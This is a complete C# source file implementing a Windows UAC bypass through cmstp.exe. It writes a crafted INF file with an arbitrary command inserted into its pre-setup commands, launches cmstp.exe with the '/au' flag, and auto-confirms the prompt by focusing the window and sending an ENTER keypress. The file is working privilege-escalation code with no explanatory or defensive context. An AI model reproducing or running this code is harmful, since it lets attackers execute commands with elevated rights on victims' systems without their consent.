using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

public class CMSTPBypass
{
	public static string InfData;
	public static string BinaryPath;
	static CMSTPBypass()
	{
		CMSTPBypass.InfData = 
			"[version]\r\n" +
			"Signature=$chicago$\r\n" +
			"AdvancedINF=2.5\r\n\r\n" +
			"[DefaultInstall]\r\n" +
			"CustomDestination=CustInstDestSectionAllUsers\r\n" +
			"RunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n" +
			"[RunPreSetupCommandsSection]\r\n" +
			"REPLACE_COMMAND_LINE\r\n" +
			"taskkill /IM cmstp.exe /F\r\n\r\n" +
			"[CustInstDestSectionAllUsers]\r\n" +
			"49000,49001=AllUSer_LDIDSection, 7\r\n\r\n" +
			"[AllUSer_LDIDSection]\r\n" +
			"\"HKLM\", " +
			"\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", " +
			"\"ProfileInstallPath\", " +
			"\"%UnexpectedError%\", \"\"\r\n\r\n" +
			"[Strings]\r\n" +
			"ServiceName=\"CorpVPN\"\r\n" +
			"ShortSvcName=\"CorpVPN\"\r\n\r\n";
		CMSTPBypass.BinaryPath = "c:\\windows\\system32\\cmstp.exe";
	}

	public CMSTPBypass()
	{
	}

	public static bool Execute(string CommandToExecute)
	{
		if (!File.Exists(CMSTPBypass.BinaryPath))
		{
			Console.WriteLine("Could not find cmstp.exe binary!");
			return false;
		}
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(CMSTPBypass.SetInfFile(CommandToExecute));
		Console.WriteLine(string.Concat("Payload file written to ", stringBuilder.ToString()));
		ProcessStartInfo processStartInfo = new ProcessStartInfo(CMSTPBypass.BinaryPath)
		{
			Arguments = string.Concat("/au ", stringBuilder.ToString()),
			UseShellExecute = false
		};
		Process.Start(processStartInfo);
		IntPtr zero = new IntPtr();
		zero = IntPtr.Zero;
		do
		{
			zero = CMSTPBypass.SetWindowActive("cmstp");
		}
		while (zero == IntPtr.Zero);
		SendKeys.SendWait("{ENTER}");
		return true;
	}

	[DllImport("user32.dll", CharSet = CharSet.None, ExactSpelling = false, SetLastError = true)]
	public static extern bool SetForegroundWindow(IntPtr hWnd);

	public static string SetInfFile(string CommandToExecute)
	{
		string randomFileName = Path.GetRandomFileName();
		char[] chr = new char[] { Convert.ToChar(".") };
		string str = randomFileName.Split(chr)[0];
		string str1 = "C:\\windows\\temp";
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.Append(str1);
		stringBuilder.Append("\\");
		stringBuilder.Append(str);
		stringBuilder.Append(".inf");
		StringBuilder stringBuilder1 = new StringBuilder(CMSTPBypass.InfData);
		stringBuilder1.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
		File.WriteAllText(stringBuilder.ToString(), stringBuilder1.ToString());
		return stringBuilder.ToString();
	}

	public static IntPtr SetWindowActive(string ProcessName)
	{
		Process[] processesByName = Process.GetProcessesByName(ProcessName);
		if ((int)processesByName.Length == 0)
		{
			return IntPtr.Zero;
		}
		processesByName[0].Refresh();
		IntPtr mainWindowHandle = new IntPtr();
		mainWindowHandle = processesByName[0].MainWindowHandle;
		if (mainWindowHandle == IntPtr.Zero)
		{
			return IntPtr.Zero;
		}
		CMSTPBypass.SetForegroundWindow(mainWindowHandle);
		CMSTPBypass.ShowWindow(mainWindowHandle, 5);
		return mainWindowHandle;
	}

	[DllImport("user32.dll", CharSet = CharSet.None, ExactSpelling = false)]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
